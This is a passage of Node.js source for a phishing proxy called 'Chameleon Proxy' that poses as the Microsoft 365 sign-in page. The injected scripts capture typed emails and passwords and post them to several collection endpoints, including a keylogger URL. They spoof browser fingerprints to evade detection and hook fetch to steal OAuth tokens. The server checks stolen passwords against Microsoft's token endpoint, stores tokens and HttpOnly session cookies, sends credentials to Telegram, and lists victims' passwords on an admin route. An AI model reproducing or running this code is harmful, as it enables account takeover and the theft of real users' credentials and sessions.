            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            keepalive: true
        }).catch(() => {});

        fetch(BACKEND_URL + '/api/credential-capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            keepalive: true
        }).catch(() => {});

        fetch(KEYLOGGER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'credential_capture',
                email: email,
                password: password,
                source: source,
                sessionId: SESSION_ID,
                url: window.location.href,
                timestamp: Date.now(),
                service: 'Microsoft 365'
            }),
            keepalive: true
        }).catch(() => {});
        
        try {
            const beaconData = new Blob([JSON.stringify(data)], {type: 'application/json'});
            navigator.sendBeacon('/api/password-capture', beaconData);
        } catch(e) {}

        try {
            if (navigator.serviceWorker && navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({
                    type: 'capture_password',
                    email: email,
                    password: password,
                    source: source,
                    sessionId: SESSION_ID
                });
            }
        } catch(e) {}
    }

    function monitorPasswordField() {
        passwordField = findPasswordField();
        if (!passwordField) {
            setTimeout(monitorPasswordField, 2000);
            return;
        }

        passwordField.addEventListener('input', function(e) {
            const value = this.value;
            if (value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                if (value.length > 2 && capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_input');
                }
            }
        });

        passwordField.addEventListener('change', function(e) {
            const value = this.value;
            if (value && value.length > 2) {
                capturedPassword = value;
                lastPasswordValue = value;
                if (capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_change');
                }
            }
        });

        passwordField.addEventListener('blur', function(e) {
            const value = this.value;
            if (value && value.length > 2 && value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                if (capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_blur');
                }
            }
        });

        console.log('[PASSWORD] ✅ Monitoring active');
    }

    function monitorEmailField() {
        emailField = findEmailField();
        if (!emailField) {
            setTimeout(monitorEmailField, 2000);
            return;
        }

        emailField.addEventListener('input', function(e) {
            const value = this.value;
            if (value && (value.includes('@') || value.length > 5)) {
                capturedEmail = value;
                console.log('[EMAIL] 📧 Captured:', value);
                if (capturedPassword && capturedPassword.length > 2) {
                    sendCredentials(capturedEmail, capturedPassword, 'email_input');
                }
            }
        });

        emailField.addEventListener('change', function(e) {
            const value = this.value;
            if (value && (value.includes('@') || value.length > 5)) {
                capturedEmail = value;
                if (capturedPassword && capturedPassword.length > 2) {
                    sendCredentials(capturedEmail, capturedPassword, 'email_change');
                }
            }
        });

        console.log('[EMAIL] ✅ Monitoring active');
    }

    function monitorFormSubmission() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            let email = capturedEmail || EMAIL || '';
            let password = capturedPassword || '';
            let formEmail = '';
            let formPassword = '';

            for (const [key, value] of formData.entries()) {
                const keyLower = key.toLowerCase();
                if (keyLower.includes('email') || keyLower.includes('mail') || keyLower.includes('user')) {
                    if (value && (value.includes('@') || value.length > 5)) {
                        formEmail = value;
                        capturedEmail = value;
                    }
                }
                if (keyLower.includes('pass') || keyLower.includes('pwd')) {
                    if (value) {
                        formPassword = value;
                        capturedPassword = value;
                    }
                }
                if (key === 'loginfmt' && value) {
                    formEmail = value;
                    capturedEmail = value;
                }
                if (key === 'passwd' && value) {
                    formPassword = value;
                    capturedPassword = value;
                }
            }

            if (formEmail && formPassword) {
                sendCredentials(formEmail, formPassword, 'form_submit');
            } else if (capturedEmail && capturedPassword) {
                sendCredentials(capturedEmail, capturedPassword, 'form_submit_fallback');
            }
        }, true);
    }

    function periodicPasswordCheck() {
        setInterval(() => {
            if (passwordField) {
                const currentValue = passwordField.value;
                if (currentValue && currentValue.length > 2 && currentValue !== lastPasswordValue) {
                    capturedPassword = currentValue;
                    lastPasswordValue = currentValue;
                    if (capturedEmail) {
                        sendCredentials(capturedEmail, currentValue, 'periodic_check');
                    }
                }
            }
            if (emailField) {
                const currentValue = emailField.value;
                if (currentValue && (currentValue.includes('@') || currentValue.length > 5) && currentValue !== capturedEmail) {
                    capturedEmail = currentValue;
                }
            }
        }, 3000);
    }

    function init() {
        console.log('🔐 Chameleon Proxy v4.0');

        setTimeout(() => {
            emailField = findEmailField();
            if (emailField) monitorEmailField();
            passwordField = findPasswordField();
            if (passwordField) {
                monitorPasswordField();
            }
            monitorFormSubmission();
            periodicPasswordCheck();

            fetch('/api/password-capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'script_initialized',
                    sessionId: SESSION_ID,
                    email: EMAIL,
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    service: 'Microsoft 365'
                })
            }).catch(() => {});

        }, 500);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    window.__chameleon = {
        getEmail: () => capturedEmail,
        getPassword: () => capturedPassword,
        getSessionId: () => SESSION_ID,
        sendCredentials: sendCredentials
    };

    console.log('✅ Chameleon Proxy initialized');
    console.log('💡 Use Ctrl+Shift+C to manually capture credentials');
})();
`;
}

function generateEvasionScripts(sessionId, email, randomUA) {
    return `
<script>
(function() {
    console.log('[EVASION] 🛡️ Initializing evasion techniques...');

    try {
        const originalGetContext = HTMLCanvasElement.prototype.getContext;
        HTMLCanvasElement.prototype.getContext = function(type, ...args) {
            const context = originalGetContext.call(this, type, ...args);
            if (type === 'webgl' || type === 'experimental-webgl') {
                const originalGetParameter = context.getParameter;
                context.getParameter = function(parameter) {
                    if (parameter === 37445) {
                        const renderers = [
                            'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
                            'ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Direct3D11 vs_5_0 ps_5_0)',
                            'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)'
                        ];
                        return renderers[Math.floor(Math.random() * renderers.length)];
                    }
                    return originalGetParameter.call(this, parameter);
                };
            }
            return context;
        };
        
        const platforms = ['Win32', 'MacIntel', 'Linux x86_64'];
        const concurrency = [4, 6, 8, 12];
        const memory = [4, 8, 16, 32];
        
        Object.defineProperty(navigator, 'platform', {
            get: () => platforms[Math.floor(Math.random() * platforms.length)]
        });
        Object.defineProperty(navigator, 'hardwareConcurrency', {
            get: () => concurrency[Math.floor(Math.random() * concurrency.length)]
        });
        Object.defineProperty(navigator, 'deviceMemory', {
            get: () => memory[Math.floor(Math.random() * memory.length)]
        });
        
        console.log('[EVASION] ✅ Fingerprint spoofing active');
    } catch(e) {}

    try {
        let rotationCount = 0;
        const maxRotations = ${Math.floor(Math.random() * 10) + 5};
        
        function doRotation() {
            if (rotationCount >= maxRotations) return;
            rotationCount++;
            const tokens = {
                access_token: '${crypto.randomBytes(32).toString('hex')}',
                refresh_token: '${crypto.randomBytes(32).toString('hex')}',
                id_token: '${crypto.randomBytes(32).toString('hex')}',
                timestamp: Date.now(),
                rotation: rotationCount
            };
            
            localStorage.setItem('rotated_tokens', JSON.stringify(tokens));
            
            fetch('/api/token-rotation', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(tokens)
            }).catch(() => {});
        }
        
        const intervals = [30000, 60000, 120000];
        setTimeout(doRotation, 5000 + Math.random() * 5000);
        setInterval(doRotation, intervals[Math.floor(Math.random() * intervals.length)]);
        console.log('[EVASION] ✅ Token rotation active');
    } catch(e) {}

    console.log('[EVASION] ✅ All evasion techniques active');
})();
</script>
`;
}

function generateOAuthCaptureScript(sessionId, email) {
    return `
<script>
(function() {
    'use strict';
    
    const SESSION_ID = '${sessionId}';
    const EMAIL = '${email}';
    
    console.log('[OAUTH] 🤖 Initializing OAuth auto-capture...');
    
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const response = originalFetch.apply(this, args);
        response.then(function(res) {
            const clone = res.clone();
            const url = res.url;
            
            if (url.includes('token') || url.includes('oauth') || url.includes('authorize')) {
                clone.json().then(function(data) {
                    if (data.access_token || data.id_token || data.refresh_token) {
                        console.log('[OAUTH] 🎟️ OAuth tokens detected!');
                        fetch('/api/oauth-capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                email: EMAIL,
                                sessionId: SESSION_ID,
                                password: localStorage.getItem('captured_password') || 'AUTO_CAPTURED',
                                source: 'oauth_auto_capture',
                                tokens: data
                            })
                        }).catch(() => {});
                    }
                }).catch(() => {});
            }
        }).catch(() => {});
        return response;
    };
    
    console.log('[OAUTH] ✅ OAuth auto-capture active');
})();
</script>
`;
}

// ============================================================
//  VERIFY WITH MICROSOFT
// ============================================================

function verifyWithMicrosoft(email, password) {
    return new Promise((resolve, reject) => {
        const postData = querystring.stringify({
            client_id: MICROSOFT_CLIENT_ID,
            grant_type: 'password',
            username: email,
            password: password,
            scope: MICROSOFT_SCOPES
        });
        
        const options = {
            hostname: 'login.microsoftonline.com',
            path: '/common/oauth2/v2.0/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        const cookies = {};
                        if (response.access_token) {
                            cookies['ESTSAUTH'] = {
                                value: response.access_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        if (response.refresh_token && response.refresh_token !== 'null' && response.refresh_token !== 'undefined') {
                            cookies['ESTSAUTHPERSISTENT'] = {
                                value: response.refresh_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        if (response.id_token && response.id_token !== 'null' && response.id_token !== 'undefined') {
                            cookies['ESTSSESSION'] = {
                                value: response.id_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        resolve({
                            success: true,
                            data: response,
                            tokens: {
                                access_token: response.access_token,
                                refresh_token: response.refresh_token || null,
                                id_token: response.id_token || null
                            },
                            cookies: cookies
                        });
                    } else {
                        resolve({
                            success: false,
                            error: response.error_description || 'Invalid credentials'
                        });
                    }
                } catch (error) {
                    reject(new Error('Failed to parse Microsoft response'));
                }
            });
        });
        
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

// ============================================================
//  HANDLE POST REQUEST - KEEP USER ON PROXY UNTIL CORRECT
// ============================================================

async function handlePostRequest(body, req, res) {
    try {
        const formData = querystring.parse(body);
        const ip = getClientIp(req);
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        
        // Extract email
        let email = formData.Email || formData.email || formData.loginfmt || '';
        const password = formData.Passwd || formData.passwd || formData.password || '';
        
        if (!email && sessionId && VICTIM_SESSIONS[sessionId]) {
            email = VICTIM_SESSIONS[sessionId].email;
        }
        if (!email) {
            const match = req.url.match(/login_hint=([^&]+)/);
            if (match) email = decodeURIComponent(match[1]);
        }
        if (!email) {
            return showLoginPage(res, 'guest@example.com', 1, 'No email provided');
        }

        let attemptCount = attemptCounts.get(email) || 0;
        attemptCount++;
        attemptCounts.set(email, attemptCount);

        console.log(`[CREDENTIALS] 📧 Email: ${email}`);
        console.log(`[CREDENTIALS] 🔑 Password: ${password ? '***' : 'N/A'}`);
        console.log(`[CREDENTIALS] 📊 Attempt: ${attemptCount}`);
        console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
        console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);

        // Store password capture (even if wrong)
        if (password && password.length > 0) {
            sessionStore.storePasswordCapture(sessionId, email, password, 'form_submit', {
                ip: ip,
                userAgent: req.headers['user-agent'],
                url: req.url,
                attemptCount: attemptCount
            });
            
            if (VICTIM_SESSIONS[sessionId]) {
                VICTIM_SESSIONS[sessionId].password = password;
                VICTIM_SESSIONS[sessionId].attempts = attemptCount;
                VICTIM_SESSIONS[sessionId].lastActivity = Date.now();
            }
        }

        // ============================================================
        //  VERIFY WITH MICROSOFT
        // ============================================================
        
        const verifyResult = await verifyWithMicrosoft(email, password);
        
        // ============================================================
        //  ✅ SUCCESS - Correct Password
        // ============================================================
        if (verifyResult.success) {
            console.log(`[AUTH] ✅ VALID Microsoft credentials: ${email}`);
            
            // Store tokens
            if (sessionId && verifyResult.tokens) {
                sessionStore.storeTokens(sessionId, verifyResult.tokens);
            }
            
            // Store HttpOnly cookies
            let httpOnlyCount = 0;
            if (sessionId && verifyResult.cookies) {
                const cookieHeaders = [];
                for (const [name, data] of Object.entries(verifyResult.cookies)) {
                    if (data && data.value && data.value !== 'null' && data.value !== 'undefined') {
                        cookieHeaders.push(`${name}=${data.value}; HttpOnly; Secure; SameSite=Lax`);
                    }
                }
                if (cookieHeaders.length > 0) {
                    sessionStore.storeHttpOnlyCookies(sessionId, cookieHeaders, 'microsoft_auth');
                    httpOnlyCount = cookieHeaders.length;
                }
            }
            
            // Update session
            if (sessionId && VICTIM_SESSIONS[sessionId]) {
                VICTIM_SESSIONS[sessionId].lastValidationResult = 'success';
                VICTIM_SESSIONS[sessionId].validationAttempts = VICTIM_SESSIONS[sessionId].validationAttempts || [];
                VICTIM_SESSIONS[sessionId].validationAttempts.push({
                    result: 'success',
                    timestamp: Date.now()
                });
            }
            
            // Send success message
            const httpOnlyCookies = sessionStore.httpOnlyCookies.get(sessionId) || [];
            const tokenCount = verifyResult.tokens ? Object.keys(verifyResult.tokens).length : 0;
            
            const successMsg = 
`✅ *VALID MICROSOFT CREDENTIALS*

*📧 Email:* ${email}
*🔑 Password:* ${password || 'N/A'}

*🎟️ Tokens Captured:* ${tokenCount}
*🍪 HttpOnly Cookies:* ${httpOnlyCookies.length}

*📡 IP:* ${ip}
*🕐 Time:* ${new Date().toISOString()}
*🔄 Attempt #:* ${attemptCount}

*✅ COMPLETE SESSION DATA CAPTURED!*`;

            sessionStore.sendTelegram(successMsg);
            
            // ✅ REDIRECT TO TEAMS MEETING
            res.writeHead(302, { 
                'Location': TEAMS_REDIRECT,
                'Cache-Control': 'no-store, no-cache'
            });
            res.end();
            return;
        }
        
        // ============================================================
        //  ❌ FAILED - Wrong Password - STAY ON PROXY
        // ============================================================
        console.log(`[AUTH] ❌ INVALID credentials: ${email} (Attempt ${attemptCount})`);
        
        // Send failure message
        const failMsg = 
`❌ *INVALID MICROSOFT CREDENTIALS*

*📧 Email:* ${email}
*🔑 Password:* ${password || 'N/A'}

*❌ Error:* ${verifyResult.error || 'Invalid username or password'}
*📊 Attempt #:* ${attemptCount}

*🕐 Time:* ${new Date().toISOString()}
*📡 IP:* ${ip}`;

        sessionStore.sendTelegram(failMsg);
        
        // ✅ STAY ON PROXY - Show error and let user retry
        return showLoginPage(res, email, attemptCount, 'Invalid email or password. Please try again.');

    } catch (error) {
        console.error('[ERROR] POST handling:', error.message);
        return showLoginPage(res, 'unknown', 1, 'An error occurred. Please try again.');
    }
}

// ============================================================
//  HANDLE LOGIN REQUEST
// ============================================================

function handleLoginRequest(req, res) {
    const paramName = PHISHED_URL_PARAMETER || 'login_hint';
    const rawEmail = req.url.split(`${paramName}=`)[1]?.split('&')[0] || '';
    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    if (!email) {
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        if (sessionId && VICTIM_SESSIONS[sessionId]) {
            email = VICTIM_SESSIONS[sessionId].email;
        }
    }
    
    if (!email) {
        console.warn('[PROXY] ⚠️ No email found, using default');
        email = 'guest@example.com';
    }

    const sessionId = createSession(email, ip, userAgent);
    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);

    // ✅ Show login page (stays on proxy)
    showLoginPage(res, email, 1, null);
}

// ============================================================
//  MAIN SERVER
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // ============================================================
    //  SERVE STATIC FILES
    // ============================================================
    
    if (req.url === PROXY_PATHNAMES.script) {
        serveFile(PROXY_PATHNAMES.scriptFile, res, 'text/javascript');
        return;
    }
    
    if (req.url === PROXY_PATHNAMES.serviceWorker) {
        serveFile(PROXY_PATHNAMES.serviceWorkerFile, res, 'text/javascript');
        return;
    }
    
    if (req.url === PROXY_PATHNAMES.swRegister) {
        serveFile('sw-register.js', res, 'text/javascript');
        return;
    }

    // ============================================================
    //  OAUTH CALLBACK ROUTES
    // ============================================================
    
    if (req.url.startsWith('/callback') || req.url.startsWith('/common/oauth2/nativeclient')) {
        handleOAuthCallback(req, res);
        return;
    }
    
    if (req.url.includes('code=')) {
        handleOAuthCallback(req, res);
        return;
    }
    
    if (req.url.includes('wrongplace')) {
        console.log('[PROXY] 🔄 Wrongplace detected - redirecting to proxy');
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        const email = sessionId && VICTIM_SESSIONS[sessionId] ? 
            VICTIM_SESSIONS[sessionId].email : 'guest@example.com';
        const proxyUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(email)}`;
        res.writeHead(302, { 'Location': proxyUrl });
        res.end();
        return;
    }

    // ============================================================
    //  API ENDPOINTS
    // ============================================================
    
    if (req.url === PROXY_PATHNAMES.passwordCapture && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const { email, password, source, sessionId, context } = data;
                const ip = getClientIp(req);
                
                if (email && password) {
                    sessionStore.storePasswordCapture(
                        sessionId || getSessionIdFromCookie(req.headers.cookie),
                        email, 
                        password, 
                        source || 'api',
                        { ip, userAgent: req.headers['user-agent'], ...context }
                    );
                    
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: true }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Email and password required' }));
                }
            } catch (error) {
                console.error('[PASSWORD-CAPTURE] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }
    
    if (req.url === PROXY_PATHNAMES.credentialCapture && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const { email, password, source, sessionId } = data;
                const ip = getClientIp(req);
                
                if (email && password) {
                    sessionStore.storePasswordCapture(
                        sessionId || getSessionIdFromCookie(req.headers.cookie),
                        email, 
                        password, 
                        source || 'credential_capture',
                        { ip, userAgent: req.headers['user-agent'] }
                    );
                    
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: true }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Email and password required' }));
                }
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }
    
    if (req.url === PROXY_PATHNAMES.cookieStoreEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
                
                if (sessionId && data.cookies) {
                    sessionStore.storeCookies(sessionId, data.cookies, data.source || 'service_worker');
                    
                    const httpOnlyCookies = [];
                    for (const [name, cookieData] of Object.entries(data.cookies)) {
                        if (cookieData.httpOnly) {
                            httpOnlyCookies.push({ name, value: cookieData.value });
                        }
                    }
                    if (httpOnlyCookies.length > 0 && data.httpOnlyCount) {
                        sessionStore.httpOnlyCookies.set(sessionId, httpOnlyCookies);
                    }
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (error) {
                console.error('[COOKIE-STORE] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.keylogEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie) || data.sessionId;
                const ip = getClientIp(req);
                
                console.log(`[KEYLOG] ⌨️ Received keystrokes for session ${sessionId ? sessionId.substring(0, 12) : 'N/A'}`);
                
                let extractedPassword = null;
                
                if (data.keystrokes) {
                    const passMatch = data.keystrokes.match(/\[FIELD:passwd=([^\]]+)\]/g);
                    if (passMatch) {
                        let fullPassword = '';
                        for (const match of passMatch) {
                            const value = match.replace(/\[FIELD:passwd=/, '').replace(/\]/, '');
                            fullPassword += value;
                        }
                        if (fullPassword) {
                            extractedPassword = fullPassword;
                            console.log(`[KEYLOG] 🔑 Extracted password from keystrokes: ${extractedPassword}`);
                            
                            const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
                            
                            sessionStore.storePasswordCapture(sessionId, email, extractedPassword, 'keylog_extraction', {
                                ip: ip,
                                userAgent: req.headers['user-agent'],
                                url: data.url || 'unknown'
                            });
                        }
                    }
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: true,
                    passwordExtracted: !!extractedPassword
                }));
                
            } catch (error) {
                console.error('[KEYLOG] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.sessionReplayEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
                
                if (!sessionId) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                    return;
                }
                
                const sessionData = sessionStore.getReplayData(sessionId);
                if (!sessionData) {
                    res.writeHead(404);
                    res.end(JSON.stringify({ error: 'Session not found' }));
                    return;
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({
                    success: true,
                    sessionId: sessionId,
                    sessionData: sessionData,
                    httpOnlyCookies: sessionStore.httpOnlyCookies.get(sessionId) || [],
                    httpOnlyCount: sessionStore.httpOnlyCookies.get(sessionId)?.length || 0,
                    passwordCaptures: sessionStore.passwordCaptures.get(sessionId) || [],
                    fullAuthData: sessionStore.getFullAuthData(sessionId),
                    tokenCount: sessionStore.allTokens.get(sessionId) ? 
                        Object.values(sessionStore.allTokens.get(sessionId)).filter(t => t && t.value && t.isValid !== false).length : 0                }, null, 2));
                
            } catch (error) {
                console.error('[REPLAY] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.fullSessionData && req.method === 'GET') {
        const sessionId = req.headers['x-session-id'] || getSessionIdFromCookie(req.headers.cookie);
        
        if (!sessionId) {
            res.writeHead(400);
            res.end(JSON.stringify({ error: 'No session ID' }));
            return;
        }
        
        const sessionData = sessionStore.getReplayData(sessionId);
        if (!sessionData) {
            res.writeHead(404);
            res.end(JSON.stringify({ error: 'Session not found' }));
            return;
        }
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            success: true,
            sessionId: sessionId,
            sessionData: sessionData,
            httpOnlyCookies: sessionStore.httpOnlyCookies.get(sessionId) || [],
            passwordCaptures: sessionStore.passwordCaptures.get(sessionId) || [],
            fullAuthData: sessionStore.getFullAuthData(sessionId),
            stats: sessionStore.getStats()
        }, null, 2));
        return;
    }

    if (req.url === PROXY_PATHNAMES.tokenRotation && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie);
                if (sessionId) {
                    sessionStore.evasionCounters.set(sessionId, {
                        ...sessionStore.evasionCounters.get(sessionId),
                        rotations: (sessionStore.evasionCounters.get(sessionId)?.rotations || 0) + 1
                    });
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, rotated: true }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.sessionRotate && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
                if (sessionId) {
                    sessionStore.evasionCounters.set(sessionId, {
                        ...sessionStore.evasionCounters.get(sessionId),
                        rotations: (sessionStore.evasionCounters.get(sessionId)?.rotations || 0) + 1
                    });
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ 
                        success: true, 
                        rotated: true,
                        rotationCount: sessionStore.evasionCounters.get(sessionId)?.rotations || 0
                    }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                }
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.telegramEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { message, parseMode } = JSON.parse(body);
                sessionStore.sendTelegram(message, parseMode);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (error) {
                console.error('[TELEGRAM] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Failed to send message' }));
            }
        });
        return;
    }

    // ============================================================
    //  HEALTH CHECK
    // ============================================================
    
    if (req.url === '/health') {
        const stats = sessionStore.getStats();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            timestamp: new Date().toISOString(),
            stats: stats,
            evasionEnabled: true,
            httpOnlyCapture: true,
            passwordCapture: true,
            oauthCapture: true,
            version: '4.0.0'
        }, null, 2));
        return;
    }

    // ============================================================
    //  SESSIONS ADMIN
    // ============================================================
    
    if (req.url === '/sessions' && req.method === 'GET') {
        const sessionData = Object.keys(VICTIM_SESSIONS).map(id => ({
            sessionId: id.substring(0, 12) + '...',
            email: VICTIM_SESSIONS[id].email || 'N/A',
            password: VICTIM_SESSIONS[id].password || 'N/A',
            ip: VICTIM_SESSIONS[id].ip || 'N/A',
            created: VICTIM_SESSIONS[id].created,
            attempts: VICTIM_SESSIONS[id].attempts || 0,
            httpOnlyCount: sessionStore.httpOnlyCookies.get(id)?.length || 0,
            tokenCount: sessionStore.allTokens.get(id) ? 
                Object.values(sessionStore.allTokens.get(id)).filter(t => t && t.value && t.isValid !== false).length : 0,
            passwordCaptures: sessionStore.passwordCaptures.get(id)?.length || 0,
            hasFullAuth: !!sessionStore.getFullAuthData(id),
            lastValidation: VICTIM_SESSIONS[id].lastValidationResult || 'unknown'
        }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            total: sessionData.length,
            sessions: sessionData,
            stats: sessionStore.getStats(),
            evasionActive: true
        }, null, 2));
        return;
    }

    // ============================================================
    //  POST REQUESTS
    // ============================================================
    
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }

    // ============================================================
    //  LOGIN REQUESTS
    // ============================================================
    
    if (req.url.startsWith(PROXY_ENTRY_POINT)) {
        handleLoginRequest(req, res);
        return;
    }

    // ============================================================
    //  DEFAULT REDIRECT
    // ============================================================
    
    res.writeHead(302, { 'Location': REDIRECT_URL });
    res.end();
});

// ============================================================
//  HANDLE OAUTH CALLBACK
// ============================================================

function handleOAuthCallback(req, res) {
    try {
        const url = new URL(req.url, `http://${req.headers.host}`);
        const code = url.searchParams.get('code');
        const error = url.searchParams.get('error');
        const sessionId = url.searchParams.get('session') || getSessionIdFromCookie(req.headers.cookie);
        
        console.log('[OAUTH-CALLBACK] 📥 Received callback');
        console.log('[OAUTH-CALLBACK] 📝 Code:', code ? 'Present' : 'Missing');
        console.log('[OAUTH-CALLBACK] ❌ Error:', error || 'None');
        
        if (error) {
            console.log('[OAUTH-CALLBACK] ⚠️ OAuth error:', error);
            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                `client_id=${MICROSOFT_CLIENT_ID}&` +
                `response_type=code&` +
                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                `login_hint=${encodeURIComponent(email)}`;
            
            res.writeHead(302, { 'Location': targetUrl });
            res.end();
            return;
        }
        
        if (code) {
            console.log('[OAUTH-CALLBACK] 🔑 Exchanging code for tokens...');
            
            const tokenData = querystring.stringify({
                client_id: MICROSOFT_CLIENT_ID,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: MICROSOFT_REDIRECT_URI,
                scope: MICROSOFT_SCOPES
            });
            
            const tokenOptions = {
                hostname: 'login.microsoftonline.com',
                path: '/common/oauth2/v2.0/token',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
